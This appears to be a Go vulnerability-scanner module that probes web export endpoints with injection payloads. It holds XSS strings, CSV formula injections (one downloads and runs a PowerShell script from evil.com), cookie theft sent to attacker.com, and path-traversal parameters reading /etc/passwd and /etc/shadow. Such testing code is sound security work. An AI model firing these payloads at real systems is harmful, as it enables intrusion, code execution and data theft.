package export

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

// Tester handles export functionality security testing
type Tester struct {
	logger  *logrus.Logger
	client  *http.Client
	baseURL string
}

// New creates a new export tester instance
func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
	// Set reasonable timeouts
	client.Timeout = 10 * time.Second

	return &Tester{
		logger:  logger,
		client:  client,
		baseURL: baseURL,
	}
}

// RunTests performs export functionality security tests
func (t *Tester) RunTests(paths []string) error {
	t.logger.Info("Starting export functionality security tests")

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	tests := []struct {
		name string
		fn   func(context.Context, []string) error
	}{
		{"PDF Export Injection", t.testPDFExport},
		{"CSV Export Injection", t.testCSVExport},
		{"HTML Export Injection", t.testHTMLExport},
		{"Export Parameter Injection", t.testExportParams},
		{"Export Format Manipulation", t.testExportFormat},
	}

	var wg sync.WaitGroup
	errChan := make(chan error, len(tests))

	for _, test := range tests {
		wg.Add(1)
		go func(tt struct {
			name string
			fn   func(context.Context, []string) error
		}) {
			defer wg.Done()
			if err := tt.fn(ctx, paths); err != nil {
				if !strings.Contains(err.Error(), "no such host") {
					t.logger.Warnf("%s test failed: %v", tt.name, err)
					select {
					case errChan <- err:
					default:
					}
				}
			}
		}(test)
	}

	wg.Wait()
	close(errChan)

	// Collect any errors
	var errs []error
	for err := range errChan {
		if err != nil && !strings.Contains(err.Error(), "no such host") {
			errs = append(errs, err)
		}
	}

	if len(errs) > 0 {
		return fmt.Errorf("multiple test failures: %v", errs)
	}
	return nil
}

// testPDFExport tests for PDF export vulnerabilities
func (t *Tester) testPDFExport(ctx context.Context, paths []string) error {
	payloads := []string{
		"<iframe src='javascript:alert(1)'></iframe>",
		"<script>alert(document.domain)</script>",
		"<object data='javascript:alert(1)'></object>",
		"<embed src='javascript:alert(1)'></embed>",
		"<link rel='stylesheet' href='javascript:alert(1)'>",
		"<img src='x' onerror='alert(1)'>",
		"<svg onload='alert(1)'>",
		"<xml><%00 alert(1) %></xml>",
	}

	var wg sync.WaitGroup
	errChan := make(chan error, len(paths)*len(payloads))

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "pdf") {
			continue
		}

		for _, payload := range payloads {
			wg.Add(1)
			go func(path, pl string) {
				defer wg.Done()

				select {
				case <-ctx.Done():
					errChan <- ctx.Err()
					return
				default:
					headers := map[string]string{
						"Content-Type": "application/json",
					}
					data := fmt.Sprintf(`{"content":"%s"}`, pl)

					resp, err := t.makeRequestWithBody(ctx, "POST", path+"?format=pdf", headers, data)
					if err != nil {
						if !strings.Contains(err.Error(), "no such host") {
							errChan <- err
						}
						return
					}
					resp.Body.Close()

					if resp.StatusCode == http.StatusOK {
						t.logger.Warnf("PDF export injection possible with payload: %s", pl)
					}
				}
			}(p, payload)
		}
	}

	wg.Wait()
	close(errChan)

	// Collect any errors
	var errs []error
	for err := range errChan {
		if err != nil && !strings.Contains(err.Error(), "no such host") {
			errs = append(errs, err)
		}
	}

	if len(errs) > 0 {
		return fmt.Errorf("multiple PDF export test failures: %v", errs)
	}
	return nil
}

// testCSVExport tests for CSV export vulnerabilities
func (t *Tester) testCSVExport(ctx context.Context, paths []string) error {
	payloads := []string{
		"=cmd|' /C calc'!A0",
		"=@SUM(1+1)*cmd|' /C calc'!A0",
		"=cmd|' /C powershell IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'!A0",
		"+cmd|' /C calc'!A0",
		"-cmd|' /C calc'!A0",
		"@cmd|' /C calc'!A0",
		"=1+1|cmd",
	}

	var wg sync.WaitGroup
	errChan := make(chan error, len(paths)*len(payloads))

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "csv") {
			continue
		}

		for _, payload := range payloads {
			wg.Add(1)
			go func(path, pl string) {
				defer wg.Done()

				select {
				case <-ctx.Done():
					errChan <- ctx.Err()
					return
				default:
					headers := map[string]string{
						"Content-Type": "application/json",
					}
					data := fmt.Sprintf(`{"data":"%s"}`, pl)

					resp, err := t.makeRequestWithBody(ctx, "POST", path+"?format=csv", headers, data)
					if err != nil {
						if !strings.Contains(err.Error(), "no such host") {
							errChan <- err
						}
						return
					}
					resp.Body.Close()

					if resp.StatusCode == http.StatusOK {
						t.logger.Warnf("CSV export injection possible with payload: %s", pl)
					}
				}
			}(p, payload)
		}
	}

	wg.Wait()
	close(errChan)

	// Collect any errors
	var errs []error
	for err := range errChan {
		if err != nil && !strings.Contains(err.Error(), "no such host") {
			errs = append(errs, err)
		}
	}

	if len(errs) > 0 {
		return fmt.Errorf("multiple CSV export test failures: %v", errs)
	}
	return nil
}

// testHTMLExport tests for HTML export vulnerabilities
func (t *Tester) testHTMLExport(ctx context.Context, paths []string) error {
	payloads := []string{
		"<script>fetch('http://attacker.com/'+document.cookie)</script>",
		"<img src=x onerror=alert(document.domain)>",
		"<svg/onload=alert(1)>",
		"javascript:alert(1)",
		"<object data='data:text/html,<script>alert(1)</script>'>",
		"<link rel=import href='data:text/html,<script>alert(1)</script>'>",
	}

	var wg sync.WaitGroup
	errChan := make(chan error, len(paths)*len(payloads))

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "html") {
			continue
		}

		for _, payload := range payloads {
			wg.Add(1)
			go func(path, pl string) {
				defer wg.Done()

				select {
				case <-ctx.Done():
					errChan <- ctx.Err()
					return
				default:
					headers := map[string]string{
						"Content-Type": "application/json",
					}
					data := fmt.Sprintf(`{"content":"%s"}`, pl)

					resp, err := t.makeRequestWithBody(ctx, "POST", path+"?format=html", headers, data)
					if err != nil {
						if !strings.Contains(err.Error(), "no such host") {
							errChan <- err
						}
						return
					}
					resp.Body.Close()

					if resp.StatusCode == http.StatusOK {
						t.logger.Warnf("HTML export injection possible with payload: %s", pl)
					}
				}
			}(p, payload)
		}
	}

	wg.Wait()
	close(errChan)

	// Collect any errors
	var errs []error
	for err := range errChan {
		if err != nil && !strings.Contains(err.Error(), "no such host") {
			errs = append(errs, err)
		}
	}

	if len(errs) > 0 {
		return fmt.Errorf("multiple HTML export test failures: %v", errs)
	}
	return nil
}

// testExportParams tests for export parameter vulnerabilities
func (t *Tester) testExportParams(ctx context.Context, paths []string) error {
	params := []string{
		"format=../../../../etc/passwd",
		"type=../../windows/win.ini",
		"template=../../../etc/shadow",
		"output=php://filter/convert.base64-encode/resource=../../../etc/passwd",
		"dest=file:///etc/passwd",
		"path=\\\\attacker.com\\share\\file.txt",
	}

	var wg sync.WaitGroup
	errChan := make(chan error, len(paths)*len(params))

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") {
			continue
		}

		for _, param := range params {
			wg.Add(1)
			go func(path, prm string) {
				defer wg.Done()

				select {
				case <-ctx.Done():
					errChan <- ctx.Err()
					return
				default:
					resp, err := t.makeRequest(ctx, "GET", path+"?"+prm, nil)
					if err != nil {
						if !strings.Contains(err.Error(), "no such host") {
							errChan <- err
						}
						return
					}
					resp.Body.Close()

					if resp.StatusCode == http.StatusOK {
						t.logger.Warnf("Export parameter injection possible with: %s", prm)
					}
				}
			}(p, param)
		}
	}

	wg.Wait()
	close(errChan)

	// Collect any errors
	var errs []error
	for err := range errChan {
		if err != nil && !strings.Contains(err.Error(), "no such host") {
			errs = append(errs, err)
		}
	}

	if len(errs) > 0 {
		return fmt.Errorf("multiple export parameter test failures: %v", errs)
	}
	return nil
}

// testExportFormat tests for export format manipulation
func (t *Tester) testExportFormat(ctx context.Context, paths []string) error {
	formats := []string{
		"php", "jsp", "asp", "aspx",
		"config", "xml", "ini", "sh",
		"htaccess", "htpasswd", "env",
	}

	var wg sync.WaitGroup
	errChan := make(chan error, len(paths)*len(formats))

	for _, p := range paths {
		if !strings.Contains(strings.ToLower(p), "export") {
			continue
		}

		for _, format := range formats {
			wg.Add(1)
			go func(path, fmt string) {
				defer wg.Done()

				select {
				case <-ctx.Done():
					errChan <- ctx.Err()
					return
				default:
					resp, err := t.makeRequest(ctx, "GET", path+"?format="+fmt, nil)
					if err != nil {
						if !strings.Contains(err.Error(), "no such host") {
							errChan <- err
						}
						return
					}
					resp.Body.Close()

					if resp.StatusCode == http.StatusOK {
						t.logger.Warnf("Dangerous export format accepted: %s", fmt)
					}
				}
			}(p, format)
		}
	}

	wg.Wait()
	close(errChan)

	// Collect any errors
	var errs []error
	for err := range errChan {
		if err != nil && !strings.Contains(err.Error(), "no such host") {
			errs = append(errs, err)
		}
	}

	if len(errs) > 0 {
		return fmt.Errorf("multiple export format test failures: %v", errs)
	}
	return nil
}

// makeRequest performs an HTTP request
func (t *Tester) makeRequest(ctx context.Context, method, path string, headers map[string]string) (*http.Response, error) {
	req, err := http.NewRequestWithContext(ctx, method, t.baseURL+path, nil)
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := t.client.Do(req)
	if err != nil {
		// Skip DNS resolution errors
		if strings.Contains(err.Error(), "no such host") {
			return nil, err
		}
		return nil, fmt.Errorf("request failed: %w", err)
	}

	return resp, nil
}

// makeRequestWithBody performs an HTTP request with a body
func (t *Tester) makeRequestWithBody(ctx context.Context, method, path string, headers map[string]string, body string) (*http.Response, error) {
	req, err := http.NewRequestWithContext(ctx, method, t.baseURL+path, strings.NewReader(body))
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := t.client.Do(req)
	if err != nil {
		// Skip DNS resolution errors
		if strings.Contains(err.Error(), "no such host") {
			return nil, err
		}
		return nil, fmt.Errorf("request failed: %w", err)
	}

	return resp, nil
}
